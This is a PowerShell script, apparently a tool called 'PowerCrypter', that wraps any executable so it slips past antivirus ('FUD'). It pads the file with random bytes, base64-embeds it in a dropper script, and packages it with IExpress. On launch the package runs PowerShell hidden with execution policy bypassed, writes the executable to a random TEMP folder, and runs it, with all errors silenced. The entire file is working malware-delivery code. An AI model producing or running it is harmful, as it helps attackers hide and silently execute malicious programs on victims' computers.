$ErrorActionPreference = "SilentlyContinue"
Function Cryptit([string]$file){
Function New-FUD([string]$FTC){
    $bytes = [System.IO.File]::ReadAllBytes($FTC)
    $bytes += @(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
    $randbytes = [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $bytes += [Convert]::ToByte($randombytes)
    $basebytes =[Convert]::ToBase64String($bytes)
    New-Item "$env:TEMP\PowerCrypter" -Type Directory -Force
    New-Item "$env:TEMP\PowerCrypter\bits.ps1" -Type File -Force
    Clear-Content "$env:TEMP\PowerCrypter\bits.ps1" -Force
    Add-Content "$env:TEMP\PowerCrypter\bits.ps1" -Value ('$progbytes'+"="+"`"$basebytes`"")
    Add-Content "$env:TEMP\PowerCrypter\bits.ps1" -Value @'
$bytes = [Convert]::FromBase64String($progbytes)
$rand = Get-Random
New-Item "$env:TEMP\$rand\$rand.exe" -Type File -Force
[io.file]::WriteAllBytes("$env:TEMP\$rand\$rand.exe",$bytes)
& $env:TEMP\$rand\$rand.exe
'@
    New-Item "$env:TEMP\PowerCrypter\exec.bat" -Type File -Force
    Clear-Content "$env:TEMP\PowerCrypter\exec.bat" -Force
    Add-Content "$env:TEMP\PowerCrypter\exec.bat" -Value 'powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ".\bits.ps1"'
    New-Item "$env:TEMP\PowerCrypter\rand.fil" -Type File -Force
    Clear-Content "$env:TEMP\PowerCrypter\rand.fil" -Force
    $randfill = Get-Random -Minimum 99999999
    $i = 100
    while($i -gt 0){
        $randfill--
        Add-Content "$env:TEMP\PowerCrypter\rand.fil" -Value $randfill
        $i--
    }
}
New-FUD -FTC $file
function Create-Wrapper{
New-Item "$env:TEMP\PowerCrypter\wrap.sed" -Type File -Force
Clear-Content "$env:TEMP\PowerCrypter\wrap.sed" -Force
Set-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value @'
[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=1
HideExtractAnimation=1
UseLongFileName=0
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=%InstallPrompt%
DisplayLicense=%DisplayLicense%
FinishMessage=%FinishMessage%
TargetName=%TargetName%
FriendlyName=%FriendlyName%
AppLaunched=%AppLaunched%
PostInstallCmd=%PostInstallCmd%
AdminQuietInstCmd=%AdminQuietInstCmd%
UserQuietInstCmd=%UserQuietInstCmd%
SourceFiles=SourceFiles
[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
'@
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value "TargetName=$env:TEMP\PowerCrypter\comp.exe"
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value @'
FriendlyName=title
AppLaunched=cmd.exe /c echo.
PostInstallCmd=cmd.exe /c exec.bat
AdminQuietInstCmd=
UserQuietInstCmd=
FILE0="bits.ps1"
FILE1="exec.bat"
FILE2="rand.fil"
[SourceFiles]
'@
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value "SourceFiles0=$env:TEMP\PowerCrypter\"
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value @'
[SourceFiles0]
%FILE0%=
%FILE1%=
%FILE2%=
'@
Set-Location "$env:TEMP\PowerCrypter"
& iexpress.exe /N /Q wrap.sed
Wait-Process -Name iexpress
}
Create-Wrapper
$dest = Split-Path -Parent $file
$leaf = (Split-Path -Leaf $file).Split(".")[0]
Rename-Item "$env:Temp\PowerCrypter\comp.exe" -NewName ("$leaf"+".crypted"+".exe") -Force
Move-Item "$env:Temp\PowerCrypter\$leaf.crypted.exe" -Destination $dest -Force
}